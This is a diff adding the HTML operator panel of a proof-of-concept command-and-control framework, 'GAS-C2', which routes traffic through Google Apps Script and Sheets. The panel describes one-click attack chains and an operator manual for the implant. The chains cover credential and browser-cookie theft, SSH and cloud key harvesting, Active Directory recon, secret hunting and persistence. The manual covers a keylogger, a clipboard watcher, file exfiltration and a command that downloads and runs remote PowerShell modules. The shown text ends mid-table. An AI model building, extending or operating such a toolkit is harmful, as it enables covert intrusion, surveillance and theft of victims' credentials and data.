@@ -1,0 +1,1305 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GAS C2 — Attacker Panel [PoC]</title>
+  <style>
+    /* ── Reset & Base ───────────────────────────────────────────────── */
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg:       #0d1117;
+      --surface:  #161b22;
+      --border:   #30363d;
+      --accent:   #58a6ff;
+      --danger:   #f85149;
+      --success:  #3fb950;
+      --warning:  #d29922;
+      --text:     #c9d1d9;
+      --muted:    #8b949e;
+      --font:     'Courier New', monospace;
+    }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--font);
+      font-size: 13px;
+      min-height: 100vh;
+    }
+
+    /* ── Layout ─────────────────────────────────────────────────────── */
+    header {
+      background: var(--surface);
+      border-bottom: 1px solid var(--border);
+      padding: 12px 20px;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    header h1 { font-size: 15px; color: var(--accent); }
+    header .badge {
+      font-size: 10px;
+      padding: 2px 8px;
+      border-radius: 20px;
+      background: var(--danger);
+      color: #fff;
+      letter-spacing: 1px;
+    }
+    header .status-dot {
+      width: 8px; height: 8px;
+      border-radius: 50%;
+      background: var(--muted);
+      margin-left: auto;
+    }
+    header .status-dot.online { background: var(--success); }
+
+    .container { display: grid; grid-template-columns: 260px 1fr; height: calc(100vh - 45px); }
+
+    /* ── Sidebar ─────────────────────────────────────────────────────── */
+    aside {
+      background: var(--surface);
+      border-right: 1px solid var(--border);
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    .sidebar-section {
+      padding: 12px;
+      border-bottom: 1px solid var(--border);
+    }
+    .sidebar-section h2 {
+      font-size: 10px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      color: var(--muted);
+      margin-bottom: 8px;
+    }
+
+    input[type="text"], select, textarea {
+      width: 100%;
+      background: var(--bg);
+      border: 1px solid var(--border);
+      color: var(--text);
+      padding: 6px 8px;
+      border-radius: 4px;
+      font-family: var(--font);
+      font-size: 12px;
+      margin-bottom: 6px;
+    }
+    input[type="text"]:focus, textarea:focus {
+      outline: none;
+      border-color: var(--accent);
+    }
+
+    button {
+      background: var(--accent);
+      color: var(--bg);
+      border: none;
+      padding: 6px 12px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-family: var(--font);
+      font-size: 12px;
+      font-weight: bold;
+      width: 100%;
+      margin-bottom: 4px;
+      transition: opacity 0.15s;
+    }
+    button:hover   { opacity: 0.85; }
+    button:active  { opacity: 0.7; }
+    button.danger  { background: var(--danger); }
+    button.muted   { background: var(--border); color: var(--text); }
+
+    /* Agent list */
+    #agent-list { overflow-y: auto; flex: 1; }
+    .agent-item {
+      padding: 8px 12px;
+      border-bottom: 1px solid var(--border);
+      cursor: pointer;
+      transition: background 0.1s;
+    }
+    .agent-item:hover    { background: rgba(88,166,255,0.07); }
+    .agent-item.selected { background: rgba(88,166,255,0.15); border-left: 2px solid var(--accent); }
+
+    .agent-id   { font-size: 11px; color: var(--accent); }
+    .agent-meta { font-size: 10px; color: var(--muted); margin-top: 2px; }
+    .agent-seen { font-size: 9px;  color: var(--muted); }
+    .dot-active   { color: var(--success); }
+    .dot-inactive { color: var(--muted); }
+
+    /* ── Main panel ─────────────────────────────────────────────────── */
+    main {
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    /* Tabs */
+    .tabs {
+      display: flex;
+      border-bottom: 1px solid var(--border);
+      background: var(--surface);
+    }
+    .tab {
+      padding: 8px 16px;
+      cursor: pointer;
+      font-size: 12px;
+      color: var(--muted);
+      border-bottom: 2px solid transparent;
+      transition: color 0.15s;
+    }
+    .tab:hover  { color: var(--text); }
+    .tab.active { color: var(--accent); border-bottom-color: var(--accent); }
+
+    /* Tab content */
+    .tab-content { display: none; flex: 1; overflow: hidden; }
+    .tab-content.active { display: flex; flex-direction: column; }
+
+    /* Terminal */
+    #terminal {
+      flex: 1;
+      overflow-y: auto;
+      padding: 12px;
+      font-size: 12px;
+      line-height: 1.6;
+    }
+
+    .term-line { margin-bottom: 2px; }
+    .term-prompt  { color: var(--accent); }
+    .term-output  { color: var(--text); white-space: pre-wrap; word-break: break-all; }
+    .term-error   { color: var(--danger); }
+    .term-info    { color: var(--muted); }
+    .term-success { color: var(--success); }
+    .term-muted   { color: var(--border); font-size: 10px; }
+
+    .cmd-bar {
+      display: flex;
+      border-top: 1px solid var(--border);
+      padding: 8px 12px;
+      gap: 8px;
+      background: var(--surface);
+    }
+    .cmd-bar input {
+      flex: 1;
+      margin: 0;
+      background: var(--bg);
+    }
+    .cmd-bar button { width: auto; margin: 0; padding: 6px 16px; }
+
+    /* Results table */
+    .results-wrap { flex: 1; overflow-y: auto; padding: 12px; }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 11px;
+    }
+    th {
+      text-align: left;
+      padding: 6px 8px;
+      border-bottom: 1px solid var(--border);
+      color: var(--muted);
+      font-size: 10px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      position: sticky;
+      top: 0;
+      background: var(--bg);
+    }
+    td {
+      padding: 6px 8px;
+      border-bottom: 1px solid var(--border);
+      vertical-align: top;
+      max-width: 300px;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+    td.output {
+      white-space: pre;
+      font-size: 10px;
+      color: var(--success);
+      cursor: pointer;
+    }
+    tr:hover td { background: rgba(255,255,255,0.02); }
+
+    /* Quick commands */
+    .quick-cmds {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 4px;
+      padding: 8px 12px;
+      border-bottom: 1px solid var(--border);
+      background: var(--surface);
+    }
+    .qcmd {
+      padding: 3px 8px;
+      border: 1px solid var(--border);
+      border-radius: 3px;
+      cursor: pointer;
+      font-size: 11px;
+      color: var(--muted);
+      transition: all 0.1s;
+      background: transparent;
+      width: auto;
+      margin: 0;
+    }
+    .qcmd:hover { color: var(--accent); border-color: var(--accent); background: rgba(88,166,255,0.1); }
+
+    /* Stats bar */
+    .stats-bar {
+      display: flex;
+      gap: 20px;
+      padding: 6px 12px;
+      border-bottom: 1px solid var(--border);
+      background: var(--surface);
+      font-size: 11px;
+      color: var(--muted);
+    }
+    .stat-val { color: var(--text); font-weight: bold; }
+
+    /* Modal */
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.7);
+      z-index: 100;
+      align-items: center;
+      justify-content: center;
+    }
+    .modal-overlay.open { display: flex; }
+    .modal {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 20px;
+      width: 640px;
+      max-height: 80vh;
+      overflow-y: auto;
+    }
+    .modal h3 { color: var(--accent); margin-bottom: 12px; }
+    .modal pre {
+      background: var(--bg);
+      padding: 12px;
+      border-radius: 4px;
+      white-space: pre-wrap;
+      word-break: break-all;
+      font-size: 11px;
+      color: var(--success);
+      max-height: 400px;
+      overflow-y: auto;
+    }
+    .modal-close { margin-top: 12px; background: var(--border); color: var(--text); }
+  </style>
+</head>
+<body>
+
+<!-- ── Header ─────────────────────────────────────────────────────────────── -->
+<header>
+  <h1>GAS-C2 Panel</h1>
+  <span class="badge">POC</span>
+  <span id="c2-url-display" style="font-size:11px; color:var(--muted); flex:1; overflow:hidden; text-overflow:ellipsis;"></span>
+  <span id="status-dot" class="status-dot" title="C2 Status"></span>
+</header>
+
+<div class="container">
+
+  <!-- ── Sidebar ──────────────────────────────────────────────────────────── -->
+  <aside>
+    <div class="sidebar-section">
+      <h2>C2 Endpoint</h2>
+      <input id="c2-url" type="text" placeholder="https://script.google.com/macros/s/.../exec">
+      <input id="c2-token" type="text" placeholder="Token (your secret)" value="gas-c2-vrp-2026">
+      <button onclick="connect()">Connect</button>
+    </div>
+
+    <div class="sidebar-section">
+      <h2>Target</h2>
+      <select id="target-select">
+        <option value="*">* (broadcast all)</option>
+      </select>
+      <button class="muted" onclick="refreshAgents()">Refresh Agents</button>
+    </div>
+
+    <div class="sidebar-section">
+      <h2>Danger Zone</h2>
+      <button class="danger" onclick="fullReset()">⚠ Full Reset</button>
+    </div>
+
+    <div class="sidebar-section" style="padding-bottom:8px;">
+      <h2>Agents <span id="agent-count" style="color:var(--accent);">0</span></h2>
+    </div>
+    <div id="agent-list"></div>
+  </aside>
+
+  <!-- ── Main ─────────────────────────────────────────────────────────────── -->
+  <main>
+    <div class="stats-bar">
+      <span>Agents: <span class="stat-val" id="stat-agents">—</span></span>
+      <span>Commands: <span class="stat-val" id="stat-commands">—</span></span>
+      <span>Results: <span class="stat-val" id="stat-results">—</span></span>
+      <span>Last sync: <span class="stat-val" id="stat-time">—</span></span>
+    </div>
+
+    <div class="tabs">
+      <div class="tab active" onclick="switchTab('terminal')">Terminal</div>
+      <div class="tab" onclick="switchTab('results')">Results</div>
+      <div class="tab" onclick="switchTab('scenarios')">Scenarios</div>
+      <div class="tab" onclick="switchTab('about')">Info</div>
+    </div>
+
+    <!-- Terminal tab -->
+    <div class="tab-content active" id="tab-terminal">
+
+      <div id="terminal">
+        <div class="term-line term-info">// GAS-C2 Panel — Connect to endpoint and send commands</div>
+      </div>
+
+      <div class="cmd-bar">
+        <input id="cmd-input" type="text" placeholder="Command (e.g. whoami, shell Get-Process, cmd dir C:\, ls C:\Users\...)" onkeydown="if(event.key==='Enter') sendCommand()">
+        <button onclick="sendCommand()">Send</button>
+      </div>
+    </div>
+
+    <!-- Results tab -->
+    <div class="tab-content" id="tab-results">
+      <div style="padding:8px 12px; border-bottom:1px solid var(--border); display:flex; gap:8px; flex-wrap:wrap;">
+        <button class="muted" style="width:auto; padding:4px 12px;" onclick="fetchResults()">Refresh</button>
+        <button class="muted" style="width:auto; padding:4px 12px;" onclick="exportJSON()">Export JSON</button>
+        <button class="danger" style="width:auto; padding:4px 12px;" onclick="clearResultsTable()">Clear Table</button>
+      </div>
+      <div class="results-wrap">
+        <table id="results-table">
+          <thead>
+            <tr>
+              <th>Timestamp</th>
+              <th>Agent ID</th>
+              <th>Cmd ID</th>
+              <th>Output (click to expand)</th>
+            </tr>
+          </thead>
+          <tbody id="results-body">
+            <tr><td colspan="4" style="color:var(--muted); text-align:center; padding:20px;">No results yet</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- Scenarios tab -->
+    <div class="tab-content" id="tab-scenarios">
+      <div style="padding:16px 20px; overflow-y:auto; flex:1;">
+        <p style="color:var(--muted); font-size:11px; margin-bottom:16px;">
+          Automated attack chains — each scenario queues multiple commands to the selected target in sequence.
+          Switch to the <strong style="color:var(--text);">Terminal</strong> tab to watch results arrive live.
+        </p>
+
+        <!-- Scenario 1: Credential sweep -->
+        <div style="border:1px solid var(--border); border-radius:6px; padding:14px; margin-bottom:12px;">
+          <h3 style="color:var(--danger); font-size:13px; margin-bottom:6px;">Scenario 1 — Credential Sweep</h3>
+          <p style="color:var(--muted); font-size:11px; margin-bottom:8px;">
+            Priority-zero exfiltration: Windows Credential Manager, WiFi cleartext passwords, Chrome/Edge
+            Login Data + Local State (offline DPAPI decryption), session cookies, SSH private keys,
+            cloud credentials (AWS/Azure/GCP/Docker/K8s), PS command history, environment variable secrets.
+          </p>
+          <div style="background:var(--bg); padding:6px 10px; border-radius:4px; font-size:11px; color:var(--muted); margin-bottom:10px; font-family:monospace;">
+            whoami &bull; sysinfo &bull; av &bull; creds &bull; wifi &bull; history &bull; cloud-keys &bull; ssh-keys &bull; browser-creds &bull; browser-cookies &bull; env
+          </div>
+          <button onclick="runScenario('creds')" style="background:var(--danger); width:auto; padding:6px 18px;">Run Credential Sweep</button>
+        </div>
+
+        <!-- Scenario 2: Network & AD recon -->
+        <div style="border:1px solid var(--border); border-radius:6px; padding:14px; margin-bottom:12px;">
+          <h3 style="color:var(--warning); font-size:13px; margin-bottom:6px;">Scenario 2 — Network &amp; AD Reconnaissance</h3>
+          <p style="color:var(--muted); font-size:11px; margin-bottom:8px;">
+            Network topology mapping: IPs, ARP table, routing, DNS cache, active connections, SMB shares,
+            Active Directory domain/PDC/DCs, AD user &amp; group enumeration, active RDP sessions,
+            firewall rules. Starts keylogger and captures initial screenshot.
+          </p>
+          <div style="background:var(--bg); padding:6px 10px; border-radius:4px; font-size:11px; color:var(--muted); margin-bottom:10px; font-family:monospace;">
+            ipconfig &bull; netstat &bull; arp &bull; route &bull; dns-cache &bull; shares &bull; domain-info &bull; ldap-users &bull; ldap-groups &bull; rdp-sessions &bull; firewall &bull; keylog start &bull; screenshot
+          </div>
+          <button onclick="runScenario('recon')" style="background:var(--warning); color:var(--bg); width:auto; padding:6px 18px;">Run Network Recon</button>
+        </div>
+
+        <!-- Scenario 3: Document exfil -->
+        <div style="border:1px solid var(--border); border-radius:6px; padding:14px; margin-bottom:12px;">
+          <h3 style="color:var(--accent); font-size:13px; margin-bottom:6px;">Scenario 3 — Document &amp; IP Exfiltration</h3>
+          <p style="color:var(--muted); font-size:11px; margin-bottom:8px;">
+            Intellectual property hunting: enumerate all Office/PDF documents, source code files and
+            Git repositories, then grep files for embedded secrets (API keys, tokens, passwords,
+            connection strings) across common config/code file types.
+          </p>
+          <div style="background:var(--bg); padding:6px 10px; border-radius:4px; font-size:11px; color:var(--muted); margin-bottom:10px; font-family:monospace;">
+            find-docs &bull; find-code &bull; find-secrets
+          </div>
+          <button onclick="runScenario('exfil')" style="width:auto; padding:6px 18px;">Run Document Hunt</button>
+        </div>
+
+        <!-- Scenario 4: Persistence -->
+        <div style="border:1px solid var(--border); border-radius:6px; padding:14px; margin-bottom:12px;">
+          <h3 style="color:var(--success); font-size:13px; margin-bottom:6px;">Scenario 4 — Persistence &amp; Lateral Prep</h3>
+          <p style="color:var(--muted); font-size:11px; margin-bottom:8px;">
+            Long-term implant setup: install Scheduled Task (AtLogon) + HKCU Run key so the agent
+            survives reboots, start continuous keylogger and clipboard watcher, capture screenshot,
+            enumerate AD users and network shares for lateral movement target selection.
+          </p>
+          <div style="background:var(--bg); padding:6px 10px; border-radius:4px; font-size:11px; color:var(--muted); margin-bottom:10px; font-family:monospace;">
+            persist &bull; keylog start &bull; clip-watch start &bull; screenshot &bull; ldap-users &bull; shares
+          </div>
+          <button onclick="runScenario('persist')" style="background:var(--success); color:var(--bg); width:auto; padding:6px 18px;">Install Persistence</button>
+        </div>
+
+        <!-- Scenario 5: Full APT chain -->
+        <div style="border:1px solid var(--danger); border-radius:6px; padding:14px;">
+          <h3 style="color:var(--danger); font-size:13px; margin-bottom:6px;">Scenario 5 — Full APT Chain</h3>
+          <p style="color:var(--muted); font-size:11px; margin-bottom:8px;">
+            Runs all four scenarios in sequence with 350 ms between commands.
+            Comprehensive initial compromise: credential theft + network recon + document hunting + persistence.
+          </p>
+          <div style="background:var(--bg); padding:6px 10px; border-radius:4px; font-size:11px; color:var(--danger); margin-bottom:10px; font-family:monospace;">
+            ~35 commands queued automatically
+          </div>
+          <button onclick="runScenario('full-apt')" class="danger" style="width:auto; padding:6px 18px;">Run Full APT Chain</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Info tab -->
+    <div class="tab-content" id="tab-about">
+      <div style="padding:20px 28px; max-width:860px; line-height:1.85; overflow-y:auto; flex:1; font-size:12px;">
+
+        <h2 style="color:var(--accent); margin-bottom:4px; font-size:16px;">GAS-C2 — Google Apps Script Command &amp; Control</h2>
+        <p style="color:var(--muted); margin-bottom:20px; font-size:11px;">v1.1.0</p>
+
+        <!-- ── How it works ── -->
+        <h3 style="color:var(--warning); margin:18px 0 8px; font-size:13px; border-bottom:1px solid var(--border); padding-bottom:4px;">How it works</h3>
+        <p style="color:var(--muted);">GAS-C2 uses <strong style="color:var(--text);">Google Apps Script</strong> as the C2 server and <strong style="color:var(--text);">Google Sheets</strong> as its database — zero owned infrastructure. All traffic passes through <code>script.google.com</code>, a universally trusted domain.</p>
+        <div style="background:var(--bg); border:1px solid var(--border); border-radius:4px; padding:10px 14px; margin:10px 0; font-size:11px; color:var(--success); line-height:1.7;">
+Panel (operator) --[HTTPS]--> script.google.com --[Sheets API]--> Google Sheets<br>
+Agent (victim)   --[HTTPS]--> script.google.com --[poll/result]--> Google Sheets<br>
+<br>
+1. Panel writes XOR-encrypted command to Sheets via ?action=queue<br>
+2. Agent polls ?action=poll every 8s (+ random jitter)<br>
+3. GAS returns the encrypted command from the sheet<br>
+4. Agent XOR-decrypts, executes, XOR-encrypts the output<br>
+5. Agent POSTs the result to GAS<br>
+6. Panel fetches ?action=results every 5s, decrypts and displays
+        </div>
+
+        <!-- ── Panel parameters ── -->
+        <h3 style="color:var(--warning); margin:18px 0 8px; font-size:13px; border-bottom:1px solid var(--border); padding-bottom:4px;">Panel parameters (sidebar)</h3>
+        <table style="width:100%; border-collapse:collapse; font-size:11px;">
+          <tr style="color:var(--muted); border-bottom:1px solid var(--border);">
+            <th style="text-align:left; padding:5px 8px; font-size:10px; text-transform:uppercase;">Field</th>
+            <th style="text-align:left; padding:5px 8px; font-size:10px; text-transform:uppercase;">Value</th>
+            <th style="text-align:left; padding:5px 8px; font-size:10px; text-transform:uppercase;">Description</th>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:5px 8px; color:var(--accent);">C2 Endpoint</td>
+            <td style="padding:5px 8px; color:var(--muted);">https://script.google.com/macros/s/...ID.../exec</td>
+            <td style="padding:5px 8px; color:var(--muted);">Deployed GAS Web App URL. From Apps Script → Deploy → Manage Deployments.</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:5px 8px; color:var(--accent);">Token</td>
+            <td style="padding:5px 8px; color:var(--muted);">gas-c2-vrp-2026</td>
+            <td style="padding:5px 8px; color:var(--muted);">Shared secret between panel and agent. Sent with every request. Must match Code.gs (CONFIG.TOKEN) and agent.ps1 (-Token).</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:5px 8px; color:var(--accent);">Target</td>
+            <td style="padding:5px 8px; color:var(--muted);">* or agent UUID</td>
+            <td style="padding:5px 8px; color:var(--muted);"><code>*</code> = broadcast to all agents. Specific UUID = sends the command only to that agent.</td>
+          </tr>
+        </table>
+
+        <!-- ── agent.ps1 parameters ── -->
+        <h3 style="color:var(--warning); margin:18px 0 8px; font-size:13px; border-bottom:1px solid var(--border); padding-bottom:4px;">agent.ps1 parameters</h3>
+        <div style="background:var(--bg); border:1px solid var(--border); border-radius:4px; padding:10px 14px; margin:8px 0; font-size:11px; color:var(--success);">
+powershell -ep bypass -File agent.ps1 [-C2Url URL] [-PollInterval 8] [-Token SECRET] [-XorKey KEY]
+        </div>
+        <table style="width:100%; border-collapse:collapse; font-size:11px;">
+          <tr style="color:var(--muted); border-bottom:1px solid var(--border);">
+            <th style="text-align:left; padding:5px 8px; font-size:10px; text-transform:uppercase;">Parameter</th>
+            <th style="text-align:left; padding:5px 8px; font-size:10px; text-transform:uppercase;">Default</th>
+            <th style="text-align:left; padding:5px 8px; font-size:10px; text-transform:uppercase;">Description</th>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:5px 8px; color:var(--accent);">-C2Url</td>
+            <td style="padding:5px 8px; color:var(--muted);">hardcoded in script</td>
+            <td style="padding:5px 8px; color:var(--muted);">GAS Web App URL. Can also be changed live with <code>set-c2 &lt;url&gt;</code>.</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:5px 8px; color:var(--accent);">-PollInterval</td>
+            <td style="padding:5px 8px; color:var(--muted);">8 (seconds)</td>
+            <td style="padding:5px 8px; color:var(--muted);">How often the agent polls for commands. A random jitter (0–4s) is added per cycle. Changeable live with <code>set-interval &lt;s&gt;</code>.</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:5px 8px; color:var(--accent);">-Token</td>
+            <td style="padding:5px 8px; color:var(--muted);">gas-c2-vrp-2026</td>
+            <td style="padding:5px 8px; color:var(--muted);">Authentication secret for the C2. Sent in every GET request to GAS.</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:5px 8px; color:var(--accent);">-XorKey</td>
+            <td style="padding:5px 8px; color:var(--muted);">GAS_VRP_2026_K</td>
+            <td style="padding:5px 8px; color:var(--muted);">XOR key for obfuscating commands and outputs in Sheets. Must be identical in the panel (XOR_KEY in JS) and Code.gs.</td>
+          </tr>
+        </table>
+
+        <!-- ── Available commands ── -->
+        <h3 style="color:var(--warning); margin:18px 0 8px; font-size:13px; border-bottom:1px solid var(--border); padding-bottom:4px;">Available commands</h3>
+
+        <p style="color:var(--accent); font-size:11px; margin:10px 0 4px;">Recon</p>
+        <table style="width:100%; border-collapse:collapse; font-size:11px;">
+          <tr><td style="padding:3px 8px; color:var(--success); width:200px;"><code>ping</code></td><td style="padding:3px 8px; color:var(--muted);">Checks if the agent is alive. Returns timestamp + agent ID.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>whoami</code></td><td style="padding:3px 8px; color:var(--muted);">Current DOMAIN\Username.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>hostname</code></td><td style="padding:3px 8px; color:var(--muted);">Machine hostname.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>sysinfo</code></td><td style="padding:3px 8px; color:var(--muted);">Full JSON: OS, IP, arch, PS version, is_admin, installed AV, timestamp.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>ps</code></td><td style="padding:3px 8px; color:var(--muted);">Running processes: Name, PID, CPU%, RAM_MB — sorted by CPU desc.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>netstat</code></td><td style="padding:3px 8px; color:var(--muted);">Active network connections (netstat -ano).</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>ipconfig</code></td><td style="padding:3px 8px; color:var(--muted);">Network adapter details (ipconfig /all).</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>arp</code></td><td style="padding:3px 8px; color:var(--muted);">ARP table (arp -a) — hosts on the same network segment.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>route</code></td><td style="padding:3px 8px; color:var(--muted);">Routing table (route print).</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>users</code></td><td style="padding:3px 8px; color:var(--muted);">Local users with enabled status and LastLogon.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>groups</code></td><td style="padding:3px 8px; color:var(--muted);">Local groups.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>drives</code></td><td style="padding:3px 8px; color:var(--muted);">Available filesystem drives.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>tasks</code></td><td style="padding:3px 8px; color:var(--muted);">Scheduled tasks in Running state.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>env</code></td><td style="padding:3px 8px; color:var(--muted);">All environment variables (PATH, APPDATA, tokens, etc.).</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>av</code></td><td style="padding:3px 8px; color:var(--muted);">Installed AV/EDR via WMI SecurityCenter2.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>clipboard</code></td><td style="padding:3px 8px; color:var(--muted);">Current clipboard contents.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>history</code></td><td style="padding:3px 8px; color:var(--muted);">Last 100 PS commands from PSReadLine history.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>wifi</code></td><td style="padding:3px 8px; color:var(--muted);">All WiFi profiles with cleartext passwords (netsh wlan key=clear).</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>creds</code></td><td style="padding:3px 8px; color:var(--muted);">Stored Windows credentials (cmdkey /list).</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>screenshot</code></td><td style="padding:3px 8px; color:var(--muted);">In-memory screen capture (no temp file), displayed inline in panel as an image.</td></tr>
+        </table>
+
+        <p style="color:var(--accent); font-size:11px; margin:12px 0 4px;">Stateful shell (persistent runspace)</p>
+        <table style="width:100%; border-collapse:collapse; font-size:11px;">
+          <tr><td style="padding:3px 8px; color:var(--success); width:200px;"><code>shell &lt;powershell&gt;</code></td><td style="padding:3px 8px; color:var(--muted);">Executes PS code in the persistent runspace. <code>cd</code>, variables, loaded modules — all persist between commands.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>cd &lt;path&gt;</code></td><td style="padding:3px 8px; color:var(--muted);">Changes the current directory in the runspace. Persists for subsequent commands.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>pwd</code></td><td style="padding:3px 8px; color:var(--muted);">Returns the current directory from the runspace.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>set-var &lt;name&gt; &lt;val&gt;</code></td><td style="padding:3px 8px; color:var(--muted);">Sets a variable in the runspace. Ex: <code>set-var apikey abc123</code> → <code>$apikey</code> available in subsequent shell commands.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>get-var &lt;name&gt;</code></td><td style="padding:3px 8px; color:var(--muted);">Reads a variable's value from the runspace.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>reset-shell</code></td><td style="padding:3px 8px; color:var(--muted);">Fully resets the runspace — clears all variables and loaded modules.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>cmd &lt;command&gt;</code></td><td style="padding:3px 8px; color:var(--muted);">Executes via cmd.exe /c. No persistent state.</td></tr>
+        </table>
+
+        <p style="color:var(--accent); font-size:11px; margin:12px 0 4px;">Filesystem &amp; file transfer</p>
+        <table style="width:100%; border-collapse:collapse; font-size:11px;">
+          <tr><td style="padding:3px 8px; color:var(--success); width:200px;"><code>ls [path]</code></td><td style="padding:3px 8px; color:var(--muted);">Lists the directory. No path = current directory from runspace.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>cat &lt;path&gt;</code></td><td style="padding:3px 8px; color:var(--muted);">Reads a file's contents (alias: type).</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>upload &lt;path&gt;</code></td><td style="padding:3px 8px; color:var(--muted);">Exfiltrates a file. Small files = single result. Large files = automatic chunked transfer, reassembled in panel and auto-downloaded in the browser.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>download &lt;url&gt; [dest]</code></td><td style="padding:3px 8px; color:var(--muted);">Downloads a file from the internet to the victim machine. No dest = saves to %TEMP%.</td></tr>
+        </table>
+
+        <p style="color:var(--accent); font-size:11px; margin:12px 0 4px;">Background jobs (async)</p>
+        <table style="width:100%; border-collapse:collapse; font-size:11px;">
+          <tr><td style="padding:3px 8px; color:var(--success); width:200px;"><code>bg &lt;command&gt;</code></td><td style="padding:3px 8px; color:var(--muted);">Launches command in background. Agent remains free for other commands. Result is auto-posted to C2 when done (cmd_id: bg-J1, bg-J2, etc.).</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>jobs</code></td><td style="padding:3px 8px; color:var(--muted);">Lists background jobs with status (RUNNING/DONE), elapsed time and command.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>job &lt;J1&gt;</code></td><td style="padding:3px 8px; color:var(--muted);">Manually retrieves a completed job's output by its ID.</td></tr>
+        </table>
+
+        <p style="color:var(--accent); font-size:11px; margin:12px 0 4px;">Keylogger</p>
+        <table style="width:100%; border-collapse:collapse; font-size:11px;">
+          <tr><td style="padding:3px 8px; color:var(--success); width:200px;"><code>keylog start</code></td><td style="padding:3px 8px; color:var(--muted);">Starts the keylogger in background (GetAsyncKeyState polling, 15ms interval). Captures keystrokes + active window title. Auto-exfiltrates to C2 every 60s if buffer &gt; 100 chars.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>keylog stop</code></td><td style="padding:3px 8px; color:var(--muted);">Stops the keylogger.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>keylog dump</code></td><td style="padding:3px 8px; color:var(--muted);">Returns and clears the accumulated buffer (keystrokes with window titles and timestamps).</td></tr>
+        </table>
+
+        <p style="color:var(--accent); font-size:11px; margin:12px 0 4px;">Clipboard watcher</p>
+        <table style="width:100%; border-collapse:collapse; font-size:11px;">
+          <tr><td style="padding:3px 8px; color:var(--success); width:200px;"><code>clip-watch start</code></td><td style="padding:3px 8px; color:var(--muted);">Monitors clipboard every 2s. Saves any new content (copied passwords, tokens, URLs) with timestamp.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>clip-watch stop</code></td><td style="padding:3px 8px; color:var(--muted);">Stops monitoring.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>clip-watch dump</code></td><td style="padding:3px 8px; color:var(--muted);">Returns everything captured and clears the local buffer.</td></tr>
+        </table>
+
+        <p style="color:var(--accent); font-size:11px; margin:12px 0 4px;">Dynamic modules</p>
+        <table style="width:100%; border-collapse:collapse; font-size:11px;">
+          <tr><td style="padding:3px 8px; color:var(--success); width:200px;"><code>load-module &lt;url&gt;</code></td><td style="padding:3px 8px; color:var(--muted);">Downloads a PS script from URL and executes it in the persistent runspace. Functions defined in the script become new commands available via <code>shell</code>. Ex: port scanner, credential dumper, etc.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>list-modules</code></td><td style="padding:3px 8px; color:var(--muted);">Lists modules loaded in the current session.</td></tr>
+        </table>
+
+        <p style="color:var(--accent); font-size:11px; margin:12px 0 4px;">Live reconfiguration</p>
+        <table style="width:100%; border-collapse:collapse; font-size:11px;">
